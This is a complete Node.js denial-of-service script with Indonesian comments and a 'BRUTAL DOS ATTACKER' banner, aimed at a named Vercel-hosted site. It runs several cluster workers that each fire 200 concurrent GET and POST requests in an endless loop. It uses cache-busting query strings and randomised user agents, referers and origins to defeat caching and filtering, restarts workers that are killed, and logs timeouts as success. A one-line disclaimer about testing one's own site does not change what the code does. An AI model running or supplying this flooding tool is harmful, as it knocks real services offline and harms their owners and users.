const axios = require('axios');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');

// URL target - diupdate ke website yang baru
const TARGET_URL = 'https://absen-v3-1.vercel.app';
// Jumlah maksimum request paralel per worker - DIKURANGI UNTUK MENGHINDARI TIMEOUT LANGSUNG
const MAX_CONCURRENT_REQUESTS = 200;
// Interval antar request (dalam ms) - SEDIKIT DELAY UNTUK MENGHINDARI PENOLAKAN TOTAL
const REQUEST_INTERVAL = 100;

// Log file
const LOG_FILE = 'dos_attack_log.txt';

// Endpoints untuk diserang - DISESUAIKAN DENGAN TARGET WEBSITE BERDASARKAN HASIL CHECK
const targetEndpoints = [
  '/',
  '/about',
  '/members',
  '/profile',
  '/gallery',
  '/contact',
  '/login',
  '/register',
  '/dashboard',
  '/admin',
  '/?ts=' + Date.now(),
  '/?nocache=' + Math.random(),
  '/login?redirect=dashboard&ts=' + Date.now(),
  '/dashboard?tab=main&nocache=' + Math.random()
];

// Fungsi untuk membuat timestamp
function getTimestamp() {
  return new Date().toISOString();
}

// Fungsi untuk log ke file
function logToFile(message) {
  fs.appendFileSync(LOG_FILE, `${getTimestamp()} - ${message}\n`);
}

// Fungsi untuk melakukan serangan dari single worker
async function attackFromWorker(workerId) {
  console.log(`Worker ${workerId} memulai serangan...`);
  logToFile(`Worker ${workerId} memulai serangan`);

  let requestCount = 0;
  let successCount = 0;
  let failCount = 0;
  
  // Fungsi untuk mengirim satu request
  async function sendRequest() {
    // Pilih endpoint secara acak
    const randomEndpoint = targetEndpoints[Math.floor(Math.random() * targetEndpoints.length)];
    // Tambahkan timestamp atau random query untuk menghindari caching
    const cacheBuster = Date.now() + Math.random();
    const targetUrl = `${TARGET_URL}${randomEndpoint}${randomEndpoint.includes('?') ? '&' : '?'}cb=${cacheBuster}&brutal=true&r=${Math.random()}`;
    
    try {
      requestCount++;
      const start = Date.now();
      
      // 10% peluang untuk mengirim POST request, yang bisa lebih berat untuk server
      const isPost = Math.random() < 0.1;
      
      // Mengirim request ke target dengan headers yang bervariasi
      let response;
      if (isPost) {
        // POST request dengan random data
        response = await axios.post(targetUrl, {
          data: generateRandomData(500), // Dikurangi dari 5KB ke 500 byte
          timestamp: Date.now(),
          randomFields: Array(5).fill(0).map((_, i) => ({ 
            key: `field_${i}`, 
            value: generateRandomData(20) 
          }))
        }, {
          timeout: 5000, // Timeout ditingkatkan menjadi 5 detik
          headers: {
            'User-Agent': getRandomUserAgent(),
            'Referer': getRandomReferer(),
            'Accept': 'text/html,application/json,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Request-ID': `worker-${workerId}-req-${requestCount}-${Date.now()}`,
            'Origin': getRandomOrigin(),
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
          }
        });
      } else {
        // GET request standar
        response = await axios.get(targetUrl, {
          timeout: 5000, // Timeout ditingkatkan menjadi 5 detik
          headers: {
            'User-Agent': getRandomUserAgent(),
            'Referer': getRandomReferer(),
            'Accept': 'text/html,application/json,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Request-ID': `worker-${workerId}-req-${requestCount}-${Date.now()}`,
            'Origin': getRandomOrigin(),
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site'
          }
        });
      }
      
      const responseTime = Date.now() - start;
      successCount++;
      
      // Log response time untuk analisis
      if (requestCount % 100 === 0) {
        console.log(`Worker ${workerId} - Request #${requestCount} ke ${targetUrl} - Status: ${response.status} - Response time: ${responseTime}ms`);
        logToFile(`Worker ${workerId} - Request #${requestCount} - Status: ${response.status} - Response time: ${responseTime}ms`);
      }
      
      // Jika waktu respons lebih dari 500ms, catat sebagai potensi keberhasilan overload
      if (responseTime > 500) {
        console.log(`\x1b[33m%s\x1b[0m`, `Worker ${workerId} - Potensi overload terdeteksi! Response time: ${responseTime}ms`);
        logToFile(`OVERLOAD DETECTED - Response time: ${responseTime}ms - URL: ${targetUrl}`);
      }
      
      // Jika waktu respons lebih dari 1.5 detik, catat sebagai overload signifikan
      if (responseTime > 1500) {
        console.log(`\x1b[31m%s\x1b[0m`, `Worker ${workerId} - SIGNIFICANT OVERLOAD! Response time: ${responseTime}ms`);
        logToFile(`SIGNIFICANT OVERLOAD - Response time: ${responseTime}ms - URL: ${targetUrl}`);
      }
      
      // Trigger POST request juga jika response cepat
      if (responseTime < 300) {
        triggerPostRequest(targetUrl, workerId, requestCount);
      }
      
    } catch (error) {
      failCount++;
      
      if (error.response) {
        // Server merespon dengan status error
        console.log(`Worker ${workerId} - Request #${requestCount} GAGAL - Status: ${error.response.status}`);
        logToFile(`Worker ${workerId} - Request #${requestCount} GAGAL - Status: ${error.response.status}`);
      } else if (error.request) {
        // Server tidak merespon (timeout) - ini menunjukkan potential DoS success
        console.log(`\x1b[31m%s\x1b[0m`, `Worker ${workerId} - Request #${requestCount} TIMEOUT - Server mungkin down!`);
        logToFile(`SERVER DOWN/TIMEOUT - Worker ${workerId} - Request #${requestCount}`);
      } else {
        // Error lainnya
        console.log(`Worker ${workerId} - Request #${requestCount} ERROR: ${error.message}`);
        logToFile(`Worker ${workerId} - Error: ${error.message}`);
      }
    }
  }
  
  // Fungsi untuk mengirim POST request sebagai tambahan beban
  async function triggerPostRequest(url, workerId, requestCount) {
    try {
      const payload = {
        data: generateRandomData(500), // Dikurangi dari 2KB ke 500 byte
        timestamp: Date.now(),
        worker: workerId,
        requestId: `post-${Date.now()}-${Math.random()}`
      };
      
      await axios.post(url, payload, {
        timeout: 5000, // Timeout ditingkatkan menjadi 5 detik
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': getRandomUserAgent(),
          'X-Request-ID': `worker-${workerId}-post-${requestCount}-${Date.now()}`
        }
      });
    } catch (error) {
      // Ignore errors for POST
    }
  }
  
  // Menjalankan multiple request secara paralel tanpa batas waktu
  while (true) {
    const promises = [];
    for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
      promises.push(sendRequest());
    }
    
    try {
      await Promise.all(promises);
    } catch (e) {
      // Ignore any errors to keep going
    }
    
    // Menunggu interval sebelum batch request berikutnya
    if (REQUEST_INTERVAL > 0) {
      await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL));
    }
  }
}

// Helper function untuk generate random data
function generateRandomData(size) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < size; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Helper functions untuk mengacak headers
function getRandomUserAgent() {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0'
  ];
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomReferer() {
  const referers = [
    'https://www.google.com/search?q=coffee+shop',
    'https://www.bing.com/search?q=best+coffee+in+town',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.instagram.com/',
    'https://www.reddit.com/r/coffee',
    'https://www.tiktok.com/',
    'https://www.youtube.com/results?search_query=best+coffee',
    'https://www.linkedin.com/',
    'https://www.pinterest.com/search/pins/?q=coffee',
    'https://www.quora.com/What-is-the-best-coffee-shop',
    'https://stackoverflow.com/'
  ];
  return referers[Math.floor(Math.random() * referers.length)];
}

function getRandomOrigin() {
  const origins = [
    'https://www.google.com',
    'https://www.facebook.com',
    'https://www.instagram.com',
    'https://www.twitter.com',
    'https://www.reddit.com',
    'https://www.youtube.com',
    'https://www.linkedin.com'
  ];
  return origins[Math.floor(Math.random() * origins.length)];
}

// Inisialisasi file log
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, `=== LOG SERANGAN DOS GRADUAL - ${getTimestamp()} ===\n\n`);
}

// Fungsi utama
if (cluster.isPrimary) {
  console.log(`\x1b[31m%s\x1b[0m`, `
██████╗ ██████╗ ██╗   ██╗████████╗ █████╗ ██╗         ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔══██╗██║         ██╔══██╗██╔═══██╗██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   ███████║██║         ██║  ██║██║   ██║███████╗
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██║         ██║  ██║██║   ██║╚════██║
██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗    ██████╔╝╚██████╔╝███████║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║   ██║      ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
`);
  console.log(`\x1b[31m%s\x1b[0m`, `Memulai simulasi serangan DoS GRADUAL pada ${TARGET_URL}`);
  console.log(`\x1b[31m%s\x1b[0m`, `PERINGATAN: Alat ini hanya untuk tujuan pengujian dan edukasi pada website milik sendiri!`);
  console.log(`\x1b[31m%s\x1b[0m`, `Tekan Ctrl+C untuk menghentikan serangan`);
  
  logToFile(`Target: ${TARGET_URL}`);
  logToFile(`Concurrent requests per worker: ${MAX_CONCURRENT_REQUESTS}`);
  
  // Menentukan jumlah CPU cores untuk worker - Gunakan LEBIH dari CPU yang tersedia
  const numCPUs = os.cpus().length;
  // Mulai dengan jumlah worker yang lebih kecil
  const numWorkers = Math.min(4, numCPUs);
  
  console.log(`\x1b[33m%s\x1b[0m`, `Menggunakan ${numWorkers} workers untuk serangan gradual...`);
  logToFile(`Menggunakan ${numWorkers} workers`);
  
  // Fork workers
  for (let i = 0; i < numWorkers; i++) {
    const worker = cluster.fork();
    worker.on('exit', (code, signal) => {
      if (signal) {
        console.log(`Worker ${worker.id} dibunuh oleh sinyal: ${signal}`);
        // Restart worker jika dibunuh
        setTimeout(() => cluster.fork(), 5000); // Tunggu 5 detik sebelum restart
      } else if (code !== 0) {
        console.log(`Worker ${worker.id} keluar dengan code: ${code}`);
        // Restart worker jika error
        setTimeout(() => cluster.fork(), 5000); // Tunggu 5 detik sebelum restart
      }
    });
  }
  
  // Handle worker exit
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.id} selesai`);
  });
  
  // Menampilkan statistik setiap 5 detik
  setInterval(() => {
    console.log(`\x1b[36m%s\x1b[0m`, `[STATS] ${new Date().toISOString()} - Serangan GRADUAL sedang berjalan dengan ${numWorkers} workers`);
  }, 5000);
  
} else {
  // Kode worker
  attackFromWorker(cluster.worker.id);
} 